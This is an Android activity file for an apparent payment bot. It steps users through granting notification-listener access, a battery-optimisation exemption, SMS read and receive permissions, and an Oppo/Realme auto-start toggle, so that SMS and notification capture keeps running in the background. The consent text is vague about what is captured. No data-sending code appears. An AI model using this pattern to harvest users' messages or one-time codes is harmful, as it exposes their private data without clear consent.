package com.example.paymentbot;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.core.app.ActivityCompat;

public class PermissionActivity extends Activity {

  private int currentPage = 1;

  @Override
  protected void onCreate(Bundle saved) {
    super.onCreate(saved);
    showPage(1);
  }

  private void showPage(int page) {
    currentPage = page;
    LinearLayout root = buildRoot();

    switch (page) {
      case 1: buildNotificationPage(root); break;
      case 2: buildBatteryPage(root); break;
      case 3: buildSmsPage(root); break;
      case 4: buildAutoStartPage(root); break;
    }

    setContentView(root);
  }

  private LinearLayout buildRoot() {
    LinearLayout root = new LinearLayout(this);
    root.setOrientation(LinearLayout.VERTICAL);
    root.setBackgroundColor(Color.WHITE);
    root.setLayoutParams(new ViewGroup
      .LayoutParams(-1, -1));

    // X close button top left
    TextView closeBtn = new TextView(this);
    closeBtn.setText("✕");
    closeBtn.setTextColor(0xFF333333);
    closeBtn.setTextSize(20);
    closeBtn.setPadding(dp(20), dp(40),
      dp(20), dp(20));
    closeBtn.setOnClickListener(
      v -> finish()
    );
    root.addView(closeBtn);

    return root;
  }

  private void buildNotificationPage(
    LinearLayout root
  ) {
    // Center content area
    LinearLayout content = new LinearLayout(this);
    content.setOrientation(LinearLayout.VERTICAL);
    content.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams cp =
      new LinearLayout.LayoutParams(-1, 0, 1f);
    content.setLayoutParams(cp);

    // Warning icon (blue triangle)
    TextView icon = new TextView(this);
    icon.setText("🔔");
    icon.setTextSize(64);
    icon.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams ip =
      new LinearLayout.LayoutParams(-2, -2);
    ip.gravity = Gravity.CENTER;
    ip.bottomMargin = dp(32);
    content.addView(icon, ip);

    // Title
    TextView title = new TextView(this);
    title.setText("Notification access required");
    title.setTextColor(0xFF1A1A1A);
    title.setTextSize(20);
    title.setTypeface(null,
      android.graphics.Typeface.BOLD);
    title.setGravity(Gravity.CENTER);
    title.setPadding(dp(32), 0, dp(32), 0);
    LinearLayout.LayoutParams tp =
      new LinearLayout.LayoutParams(-1, -2);
    tp.bottomMargin = dp(16);
    content.addView(title, tp);

    // Description
    TextView desc = new TextView(this);
    desc.setText(
      "To handle incoming notifications,\n" +
      "please allow access to notifications."
    );
    desc.setTextColor(0xFF666666);
    desc.setTextSize(15);
    desc.setGravity(Gravity.CENTER);
    desc.setPadding(dp(32), 0, dp(32), 0);
    content.addView(desc);

    root.addView(content);

    // Bottom button
    Button btn = buildBottomButton("Allow");
    btn.setOnClickListener(v -> {
      startActivity(new Intent(
        Settings
          .ACTION_NOTIFICATION_LISTENER_SETTINGS
      ));
    });
    root.addView(btn);
  }

  private void buildBatteryPage(
    LinearLayout root
  ) {
    LinearLayout content = new LinearLayout(this);
    content.setOrientation(LinearLayout.VERTICAL);
    content.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams cp =
      new LinearLayout.LayoutParams(-1, 0, 1f);
    content.setLayoutParams(cp);

    TextView icon = new TextView(this);
    icon.setText("⚠️");
    icon.setTextSize(64);
    icon.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams ip =
      new LinearLayout.LayoutParams(-2, -2);
    ip.gravity = Gravity.CENTER;
    ip.bottomMargin = dp(32);
    content.addView(icon, ip);

    TextView title = new TextView(this);
    title.setText("Battery optimization enabled");
    title.setTextColor(0xFF1A1A1A);
    title.setTextSize(20);
    title.setTypeface(null,
      android.graphics.Typeface.BOLD);
    title.setGravity(Gravity.CENTER);
    title.setPadding(dp(32), 0, dp(32), 0);
    LinearLayout.LayoutParams tp =
      new LinearLayout.LayoutParams(-1, -2);
    tp.bottomMargin = dp(16);
    content.addView(title, tp);

    TextView desc = new TextView(this);
    desc.setText(
      "To prevent the system from stopping\n" +
      "the application in the background,\n" +
      "disable battery optimization for the app."
    );
    desc.setTextColor(0xFF666666);
    desc.setTextSize(15);
    desc.setGravity(Gravity.CENTER);
    desc.setPadding(dp(32), 0, dp(32), 0);
    content.addView(desc);

    root.addView(content);

    Button btn = buildBottomButton("Disable");
    btn.setOnClickListener(v -> {
      Intent i = new Intent(
        Settings
          .ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
      );
      i.setData(Uri.parse(
        "package:" + getPackageName()
      ));
      startActivity(i);
    });
    root.addView(btn);
  }

  private void buildSmsPage(LinearLayout root) {
    LinearLayout content = new LinearLayout(this);
    content.setOrientation(LinearLayout.VERTICAL);
    content.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams cp =
      new LinearLayout.LayoutParams(-1, 0, 1f);
    content.setLayoutParams(cp);

    TextView icon = new TextView(this);
    icon.setText("💬");
    icon.setTextSize(64);
    icon.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams ip =
      new LinearLayout.LayoutParams(-2, -2);
    ip.gravity = Gravity.CENTER;
    ip.bottomMargin = dp(32);
    content.addView(icon, ip);

    TextView title = new TextView(this);
    title.setText("Additional permissions required");
    title.setTextColor(0xFF1A1A1A);
    title.setTextSize(20);
    title.setTypeface(null,
      android.graphics.Typeface.BOLD);
    title.setGravity(Gravity.CENTER);
    title.setPadding(dp(32), 0, dp(32), 0);
    LinearLayout.LayoutParams tp =
      new LinearLayout.LayoutParams(-1, -2);
    tp.bottomMargin = dp(16);
    content.addView(title, tp);

    TextView desc = new TextView(this);
    desc.setText(
      "Please provide the appropriate\n" +
      "permission for the proper handling\n" +
      "of incoming SMS messages."
    );
    desc.setTextColor(0xFF666666);
    desc.setTextSize(15);
    desc.setGravity(Gravity.CENTER);
    desc.setPadding(dp(32), 0, dp(32), 0);
    content.addView(desc);

    root.addView(content);

    Button btn = buildBottomButton("Grant");
    btn.setOnClickListener(v -> {
      ActivityCompat.requestPermissions(
        this,
        new String[]{
          android.Manifest.permission.RECEIVE_SMS,
          android.Manifest.permission.READ_SMS
        },
        100
      );
    });
    root.addView(btn);
  }

  @Override
  public void onRequestPermissionsResult(
    int requestCode,
    String[] permissions,
    int[] grantResults
  ) {
    super.onRequestPermissionsResult(
      requestCode, permissions, grantResults
    );
    if (requestCode == 100) {
      if (isColorOS()) {
        // ColorOS (Oppo/Realme) aggressively kills background services
        // unless the device's separate "Auto-start" permission is enabled —
        // distinct from every permission requested on the previous 3 pages,
        // and not something Android's standard permission APIs cover at all.
        showPage(4);
      } else {
        goToRegistration();
      }
    }
  }

  private void goToRegistration() {
    startActivity(new Intent(
      this, RegistrationActivity.class
    ));
    finish();
  }

  /**
   * True on Oppo/Realme devices, which ship ColorOS — the OEM skin known to
   * silently kill background notification-listener bindings (and SMS/
   * notification capture along with it) unless the device's own separate
   * "Auto-start" toggle is enabled, on top of every standard Android
   * permission already granted on the previous pages. OnePlus deliberately
   * excluded: its OxygenOS build has historically had its own distinct
   * background-restriction behavior, not confirmed to need this same step.
   */
  private boolean isColorOS() {
    String manufacturer = Build.MANUFACTURER == null ? "" : Build.MANUFACTURER.toLowerCase();
    return manufacturer.contains("oppo") || manufacturer.contains("realme");
  }

  private void buildAutoStartPage(LinearLayout root) {
    LinearLayout content = new LinearLayout(this);
    content.setOrientation(LinearLayout.VERTICAL);
    content.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams cp =
      new LinearLayout.LayoutParams(-1, 0, 1f);
    content.setLayoutParams(cp);

    TextView icon = new TextView(this);
    icon.setText("🚀");
    icon.setTextSize(64);
    icon.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams ip =
      new LinearLayout.LayoutParams(-2, -2);
    ip.gravity = Gravity.CENTER;
    ip.bottomMargin = dp(32);
    content.addView(icon, ip);

    TextView title = new TextView(this);
    title.setText("Enable Auto-start");
    title.setTextColor(0xFF1A1A1A);
    title.setTextSize(20);
    title.setTypeface(null,
      android.graphics.Typeface.BOLD);
    title.setGravity(Gravity.CENTER);
    title.setPadding(dp(32), 0, dp(32), 0);
    LinearLayout.LayoutParams tp =
      new LinearLayout.LayoutParams(-1, -2);
    tp.bottomMargin = dp(16);
    content.addView(title, tp);

    // ColorOS has no single universal settings screen or intent for this —
    // the exact path (Settings > App Management > MaxPay > Auto-start, or
    // Settings > Battery > App Auto Launch, depending on version) varies by
    // ColorOS release, so the on-screen text has to spell it out rather than
    // deep-link straight to it.
    TextView desc = new TextView(this);
    desc.setText(
      "Realme/Oppo phones stop background apps\n" +
      "unless Auto-start is turned on.\n\n" +
      "Open App info below, then look for\n" +
      "\"Auto-start\" (sometimes under Battery\n" +
      "or App Management) and turn it ON."
    );
    desc.setTextColor(0xFF666666);
    desc.setTextSize(15);
    desc.setGravity(Gravity.CENTER);
    desc.setPadding(dp(32), 0, dp(32), 0);
    content.addView(desc);

    root.addView(content);

    // Confirmed no universal ColorOS intent exists for the Auto-start
    // toggle itself — ACTION_APPLICATION_DETAILS_SETTINGS (the app's own
    // "App info" page) is the one reliable, version-independent deep link;
    // from there the ColorOS-specific Auto-start entry is a tap or two away.
    Button openSettingsBtn = buildSecondaryButton("Open app settings");
    openSettingsBtn.setOnClickListener(v -> {
      try {
        Intent intent = new Intent(
          Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
          Uri.parse("package:" + getPackageName())
        );
        startActivity(intent);
      } catch (Exception e) {
        // No-op — the "I've enabled it" button below is still reachable
        // even if this particular device has no app-details screen at all.
      }
    });
    root.addView(openSettingsBtn);

    // There is no OS API to verify the Auto-start toggle's state (that's
    // exactly why no universal intent exists either), so — unlike pages 1-3,
    // which auto-advance in onResume() once the real permission state
    // flips — this step needs an explicit, manual confirmation to move on.
    Button doneBtn = buildBottomButton("I've enabled it");
    doneBtn.setOnClickListener(v -> goToRegistration());
    root.addView(doneBtn);
  }

  private Button buildSecondaryButton(String text) {
    Button btn = new Button(this);
    btn.setText(text);
    btn.setTextColor(0xFF1565C0);
    btn.setTextSize(15);
    btn.setTypeface(null, android.graphics.Typeface.BOLD);
    btn.setAllCaps(false);
    btn.setBackgroundColor(Color.TRANSPARENT);

    LinearLayout.LayoutParams lp =
      new LinearLayout.LayoutParams(-1, dp(48));
    lp.setMargins(dp(24), 0, dp(24), 0);
    btn.setLayoutParams(lp);
    return btn;
  }

  @Override
  protected void onResume() {
    super.onResume();
    // Check if notification permission given
    // and advance pages
    if (currentPage == 1) {
      String flat = Settings.Secure.getString(
        getContentResolver(),
        "enabled_notification_listeners"
      );
      boolean notifEnabled = flat != null &&
        flat.contains(getPackageName());
      if (notifEnabled) showPage(2);
    } else if (currentPage == 2) {
      PowerManager pm = (PowerManager)
        getSystemService(POWER_SERVICE);
      if (pm.isIgnoringBatteryOptimizations(
          getPackageName())) {
        showPage(3);
      }
    }
  }

  private Button buildBottomButton(String text) {
    Button btn = new Button(this);
    btn.setText(text);
    btn.setTextColor(Color.WHITE);
    btn.setTextSize(16);
    btn.setTypeface(null,
      android.graphics.Typeface.BOLD);
    btn.setAllCaps(false);

    android.graphics.drawable.GradientDrawable bg =
      new android.graphics.drawable
        .GradientDrawable();
    bg.setColor(0xFF1565C0);
    bg.setCornerRadius(dp(12));
    btn.setBackground(bg);

    LinearLayout.LayoutParams lp =
      new LinearLayout.LayoutParams(-1, dp(56));
    lp.setMargins(dp(24), dp(16),
      dp(24), dp(40));
    btn.setLayoutParams(lp);
    return btn;
  }

  private int dp(int dp) {
    return Math.round(dp *
      getResources().getDisplayMetrics().density);
  }
}
